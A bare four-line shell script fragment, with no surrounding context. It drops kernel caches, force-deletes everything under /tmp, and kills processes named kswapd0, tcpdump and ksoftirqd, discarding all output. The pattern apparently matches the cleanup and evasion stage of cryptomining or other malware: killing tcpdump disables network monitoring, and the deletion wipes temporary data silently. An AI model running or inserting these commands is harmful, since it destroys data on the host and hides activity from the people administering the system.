echo 3 > /proc/sys/vm/drop_caches
sysctl -w vm.drop_caches=3 > /dev/null 2>&1
rm -rf /tmp/* > /dev/null 2>&1
killall kswapd0 tcpdump ksoftirqd > /dev/null 2>&1
